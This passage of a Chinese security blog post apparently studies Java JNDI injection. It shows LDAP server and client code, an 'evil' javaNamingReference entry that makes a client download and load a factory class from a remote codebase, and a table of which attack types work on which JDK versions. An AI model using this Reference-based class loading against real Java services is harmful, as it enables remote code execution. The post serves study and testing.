            <span class="token class-name">InMemoryDirectoryServerConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span><span class="token string">&quot;dc=eki,dc=xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//config.addAdditionalBindCredentials(&quot;uid=admin,ou=system&quot;, &quot;secret&quot;);</span>
            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>
                    <span class="token string">&quot;listen&quot;</span><span class="token punctuation">,</span> 
                    <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
                    port<span class="token punctuation">,</span>
                    <span class="token class-name">ServerSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token class-name">SocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">(</span><span class="token class-name">SSLSocketFactory</span><span class="token punctuation">)</span> <span class="token class-name">SSLSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            config<span class="token punctuation">.</span><span class="token function">setSchema</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// do not check (attribute) schema</span>
            <span class="token class-name">InMemoryDirectoryServer</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>

            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">&quot;dn: dc=eki,dc=xyz&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;objectClass: top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;objectClass: domain&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;dc: eki&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">&quot;dn: dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;objectClass: top&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;objectClass: domain&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;dc: staticsecurity&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">&quot;dn: cn=test,dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;objectClass: person&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;sn: Tester&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;givenName: Joe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;cn: test&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;memberOf: cn=test,dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Listening on 0.0.0.0:&quot;</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>客户端</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;ldap://localhost:21389&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">DirContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialDirContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">DirContext</span> lookCtx <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DirContext</span><span class="token punctuation">)</span>ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;cn=test,dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Attributes</span> res <span class="token operator">=</span> lookCtx<span class="token punctuation">.</span><span class="token function">getAttributes</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>查询结果</p> <p><img src="https://md.buptmerak.cn/uploads/upload_f85c1616487e77b564653c4737a96a88.png" alt=""></p> <p>这里的<code>cn=test,dc=javasec,dc=eki,dc=xyz</code>就是DN</p> <p>JAVA为挂载JAVA对象到LDAP服务上提供了两种途径</p> <p>一种就是通过Reference,类似我们在上面RMI所说的:
https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html</p> <p>一种就是通过序列化：
https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html</p> <h3 id="reference"><a href="#reference" class="header-anchor">#</a> Reference</h3> <p>根据文档，我们可以知道一个表示java Reference对象的ldap记录属性如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&quot;ObjectClass: javaNamingReference&quot;,
&quot;javaCodebase: http://localhost:16000/&quot;,
&quot;JavaFactory: xyz.eki.vuljndi.remote.DemoFactory&quot;,
&quot;javaClassName: whatever&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在我们之前搭好的ldapserver上添加一套记录</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>ds<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">&quot;dn: cn=evil,dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;ObjectClass: javaNamingReference&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;javaCodebase: http://localhost:16000/&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;JavaFactory: xyz.eki.vuljndi.remote.DemoFactory&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;javaClassName: whatever&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>客户端对应查询</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPClient</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;ldap://localhost:21389&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">DirContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialDirContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> demo <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;cn=evil,dc=javasec,dc=eki,dc=xyz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>demo<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_afa520b6506531510c10836062ad1a1e.png" alt=""></p> <p>可以看到我们的远程服务器接收到了下载类的命令</p> <p>不过这个在jdk8u191之后需要手动开启</p> <ul><li>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</li></ul> <p>才会放行</p> <h3 id="serialize"><a href="#serialize" class="header-anchor">#</a> Serialize</h3> <p>同上面说的LDAP服务器也支持绑定一个序列化的对象，格式如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&quot;ObjectClass: whatever&quot;
&quot;javaSerializedData: object serialize bytecode&quot;,
&quot;javaClassName: whatever&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>同时<code>Serialize</code>也支持<code>codebase</code>，不过开了<code>codebase</code>就会在高版本（jdk&gt;191）下被拦截了</p> <h2 id="_0x07-总结"><a href="#_0x07-总结" class="header-anchor">#</a> 0x07 总结</h2> <table><thead><tr><th style="text-align:center;">攻击类型</th> <th style="text-align:center;">适用jdk版本</th> <th style="text-align:center;">需要条件</th></tr></thead> <tbody><tr><td style="text-align:center;">JNDI+RMI (Reference Remote Factory)</td> <td style="text-align:center;">&lt;7u21、6u45</td> <td style="text-align:center;">无</td></tr> <tr><td style="text-align:center;">JNDI+RMI (Reference Local Factory)</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">调用端存在利用链</td></tr> <tr><td style="text-align:center;">JNDI+LDAP (Reference Remote Codebase)</td> <td style="text-align:center;">&lt;8u191</td> <td style="text-align:center;">无</td></tr> <tr><td style="text-align:center;">JNDI+LDAP (Serialize Object)</td> <td style="text-align:center;">任意</td> <td style="text-align:center;">调用端存在反序列化链</td></tr></tbody></table> <h2 id="_0x08-花絮"><a href="#_0x08-花絮" class="header-anchor">#</a> 0x08 花絮</h2> <p>在尝试JNDI的相关攻击时顺带用Golang摸了一个测试工具，实现了不需要java环境也能测试JNDI下RMI和LDAP的相关攻击向量。</p> <p>RMI是通过socket解析jrmp协议实现的
LDAP基于<a href="github.com/vjeantet/ldapserver">第三方ldap服务实现库</a></p> <p>效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_9a691f28611dbc74dda5d03a9271ebf5.png" alt=""></p> <p><img src="https://md.buptmerak.cn/uploads/upload_0698811581e2bcad73d7727618b6472e.png" alt=""></p> <p>项目地址：https://github.com/EkiXu/JNDIGo</p> <h2 id="_0x09-参考资料"><a href="#_0x09-参考资料" class="header-anchor">#</a> 0x09 参考资料</h2> <p>JNDI 注入漏洞的前世今生
https://evilpan.com/2021/12/13/jndi-injection/</p> <p>浅析JNDI注入：https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/</p> <p>Java安全之JNDI注入：
https://www.cnblogs.com/nice0e3/p/13958047.html</p> <p>RefAddr Documents</p> <p>https://www.apiref.com/java11-zh/java.naming/javax/naming/RefAddr.html</p> <p>高版本JDK下的JNDI注入浅析
https://xz.aliyun.com/t/10671#toc-1</p> <p>Storing Objects in the Directory：
https://docs.oracle.com/javase/jndi/tutorial/objects/storing/index.html</p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/EkiXu/blog/edit/master/docs/_posts/JAVA 协议安全笔记-JNDI篇.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/05/18, 16:49:51</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/qwb2022final/"><div>
            QWB CTF2022 线下赛总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/ciscn2022final/"><div>
            CISCN2022 总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/dsctf2022_final/"><div>
            DSCTF2022决赛 部分writeup
            <!----></div></a> <span class="date">08-08</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ekixu@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/EkiXu" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>EkiXu | <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.8153bfb8.js" defer></script><script src="/assets/js/2.236d623d.js" defer></script><script src="/assets/js/67.3e60853d.js" defer></script>
  </body>
</html>
